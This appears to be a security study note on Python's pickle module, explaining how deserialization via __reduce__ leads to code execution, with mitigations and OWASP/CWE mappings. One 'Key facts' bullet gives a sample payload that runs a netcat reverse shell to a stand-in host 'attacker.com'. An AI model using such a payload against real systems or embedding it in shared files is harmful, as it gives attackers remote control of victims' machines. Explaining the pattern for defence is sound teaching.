# pickle

## What it is
Like a magic spell that can turn any object into a scroll and back again, Python's `pickle` module serializes arbitrary Python objects into a byte stream and deserializes them back — but the spell can be cursed. Precisely, `pickle` is Python's native serialization format that, unlike JSON, can encode *executable logic*, meaning deserialization triggers code execution.

## Why it matters
In 2022, multiple ML platforms (including MLflow deployments) were found loading untrusted `.pkl` model files from public repositories. An attacker could publish a poisoned model file that, when a data scientist ran `pickle.load()`, executed a reverse shell — turning model sharing into remote code execution at scale. The defense is to never deserialize pickle data from untrusted sources and to use safer alternatives like `safetensors` or JSON.

## Key facts
- `pickle` achieves code execution via the `__reduce__` magic method, which instructs the deserializer to call an arbitrary callable during loading — no exploit needed, it's a feature
- The attack requires only the *deserializing* side to have the target library installed; the attacker just crafts the payload
- Common payload pattern: `__reduce__` returns `(os.system, ('nc attacker.com 4444 -e /bin/bash',))`
- Mitigations include: cryptographic signing of pickle files (HMAC), using `pickletools.dis()` to inspect before loading, or switching to format-restricted serializers
- This class of vulnerability appears in exam objectives under **insecure deserialization** (OWASP Top 10 A8:2021) and maps to CWE-502

## Related concepts
[[Insecure Deserialization]] [[Remote Code Execution]] [[Supply Chain Attack]] [[Java Deserialization]] [[OWASP Top 10]]